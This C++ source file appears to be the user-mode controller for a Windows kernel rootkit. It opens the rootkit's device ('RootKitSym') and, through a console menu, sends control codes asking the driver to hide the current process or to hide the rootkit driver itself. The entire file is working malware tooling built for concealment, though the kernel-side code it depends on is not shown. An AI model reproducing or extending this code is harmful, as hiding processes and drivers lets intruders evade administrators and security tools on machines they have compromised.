#include <Windows.h>
#include <iostream>
#include "../RootKitHideProcess/Header.h"

int main()
{
	HANDLE hDevice;
	UINT32 pid;
	int option;
	DATA_FROM_USER dataBuffer = { 0 };
	DATA_TO_USER dataBufferFromKernel = { 0 };
	hDevice = CreateFileA(
		"\\\\.\\RootKitSym",
		GENERIC_ALL,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED, 
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "error while opening a handle to the file, error code : " << GetLastError() << std::endl;
		return 0;
	}
	
	// now let's get our PID

	pid = GetCurrentProcessId();

	dataBuffer.PID = pid;
	
	for (;;) {
		std::cout << "Choose an option:\n";
		std::cout << "1) hide this user-mode process.\n";
		std::cout << "2) hide the rootkit kernel driver\n";
		std::cout << "3) Exit.\n";
		std::cin >> option;

		switch (option)
		{
		case 1:
			DeviceIoControl(hDevice, RK_CTL_PROCESS_HIDE, &dataBuffer, DATA_FROM_USER_SIZE, &dataBufferFromKernel, DATA_TO_USER_SIZE, NULL, NULL);
			std::cout << "is the process hidden (1,0)? " << dataBufferFromKernel.IsProcessHidden << std::endl;
			break;
		case 2:
			DeviceIoControl(hDevice, RK_CTL_DRIVER_HIDE, NULL, 0, NULL, 0, NULL, NULL);
			std::cout << "[+] The drive now should be hidden\n";
			break;
		case 3:
			return 0;
		default:
			break;
		}
	}

	return 0;
}